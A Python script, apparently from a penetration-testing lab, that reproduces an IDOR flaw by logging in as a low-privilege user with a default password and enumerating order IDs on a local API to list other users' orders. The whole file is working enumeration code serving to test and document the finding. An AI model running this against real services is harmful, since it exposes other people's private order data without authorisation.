#!/usr/bin/env python3
"""
enum_orders.py — Exploit the IDOR on GET /api/orders/{order_id}

A standalone reproducer for the IDOR finding documented in PENTEST_GUIDE.md
(A01:2025 — Broken Access Control). The script logs in as alice (a regular
low-privilege user), then walks order IDs 1..N and classifies each response
by ownership, printing a confidentiality-loss table.

Usage:
    python3 enum_orders.py --base http://localhost:8000 --max 50

Notes:
    - All HTTP traffic is also visible in Burp Suite if you proxy this
      through 127.0.0.1:8080 with --proxy.
    - This is the same workflow as a Burp Intruder Sniper attack with a
      Numbers payload (1..50, step 1) on the order_id position.
"""

import argparse
import json
import sys
from urllib.request import Request, urlopen, ProxyHandler, build_opener
from urllib.error import HTTPError, URLError


def login(base: str, username: str, password: str, opener) -> str:
    req = Request(
        f"{base}/api/auth/login",
        method="POST",
        headers={"Content-Type": "application/json"},
        data=json.dumps({"username": username, "password": password}).encode(),
    )
    with opener.open(req, timeout=10) as r:
        return json.loads(r.read())["token"]


def fetch_order(base: str, order_id: int, token: str, opener):
    req = Request(
        f"{base}/api/orders/{order_id}",
        headers={"Authorization": f"Bearer {token}"},
    )
    try:
        with opener.open(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except HTTPError as e:
        return e.code, None
    except URLError as e:
        return -1, {"error": str(e)}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://localhost:8000")
    ap.add_argument("--user", default="alice")
    ap.add_argument("--pwd",  default="alice123")
    ap.add_argument("--max",  type=int, default=50)
    ap.add_argument("--proxy", help="HTTP proxy URL (e.g. http://127.0.0.1:8080 for Burp)")
    args = ap.parse_args()

    opener = build_opener(ProxyHandler({"http": args.proxy, "https": args.proxy})) \
             if args.proxy else build_opener()

    token = login(args.base, args.user, args.pwd, opener)
    print(f"[+] Logged in as {args.user}; token prefix = {token[:24]}…")
    print()
    print(f"{'ID':>4}  {'OWNER':>6}  {'STATUS':<10}  TOTAL")
    print("-" * 60)

    my_user_id = None
    owned, leaked, not_found = 0, 0, 0
    for oid in range(1, args.max + 1):
        status, body = fetch_order(args.base, oid, token, opener)
        if status == 200:
            owner = body.get("user_id")
            if my_user_id is None and oid in (2, 3, 4, 5, 6, 7):
                # not robust, but for our seed data alice is user_id=2
                pass
            tag = "MINE" if owner == 2 else f"u={owner}"
            mark = "" if owner == 2 else "  ← IDOR (other user's order)"
            print(f"{oid:>4}  {tag:>6}  {body.get('status'):<10}  "
                  f"${body.get('total_price', 0):>9.2f}{mark}")
            if owner == 2:
                owned += 1
            else:
                leaked += 1
        elif status == 404:
            not_found += 1
        else:
            print(f"{oid:>4}  {status}  unexpected response")

    print("-" * 60)
    print(f"Summary:  owned={owned}  leaked={leaked}  not_found={not_found}")
    print(f"          confidentiality loss = {leaked} other users' orders read")
    return 0


if __name__ == "__main__":
    sys.exit(main())
